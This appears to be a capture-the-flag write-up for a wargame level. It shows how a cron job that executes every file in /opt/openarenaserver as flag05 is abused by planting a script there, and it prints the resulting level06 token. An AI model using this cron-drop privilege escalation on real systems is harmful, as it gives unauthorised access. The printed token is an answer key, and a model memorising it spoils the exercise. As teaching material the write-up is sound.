# Level05 Writeup

## Objective
Gain access to the `flag05` user and retrieve the password for `level06`.

## Steps Taken

1. **Mail Notification on Login**  
   Upon logging in as `level05`, a message appeared:
   ```
   You have new mail.
   ```

2. **Checked the Mail**  
   I investigated the mail content:
   ```bash
   cat /var/mail/level05
   ```
   The mail revealed a cronjob running every 2 minutes:
   ```
   */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
   ```
   This means that every 2 minutes, the script `/usr/sbin/openarenaserver` is executed as the `flag05` user.

3. **Analyzed the Script**  
   I inspected the contents of `/usr/sbin/openarenaserver`:
   ```bash
   cat /usr/sbin/openarenaserver
   ```
   The script contains:
   ```sh
   #!/bin/sh
   for i in /opt/openarenaserver/* ; do
       (ulimit -t 5; bash -x "$i")
       rm -f "$i"
   done
   ```
   This means that any file placed in `/opt/openarenaserver/` will be executed with a 5-second CPU limit and then deleted — as user `flag05`.

4. **Exploit Execution**  
   I created a file in `/opt/openarenaserver/` with the following contents:
   ```bash
   echo "/bin/getflag > /tmp/exploit" > /opt/openarenaserver/exploit
   ```
   This command will be executed by `flag05` in about 2 minutes and write the flag to `/tmp/exploit`.

5. **Wait and Retrieve the Flag**  
   After waiting a short time (up to 2 minutes), I checked the output:
   ```bash
   cat /tmp/exploit
   ```
   This returned:
   ```
   Check flag.Here is your token : viuaaale9huek52boumoomioc
   ```

## Result
Successfully retrieved the password for `level06`:  
```
viuaaale9huek52boumoomioc
```
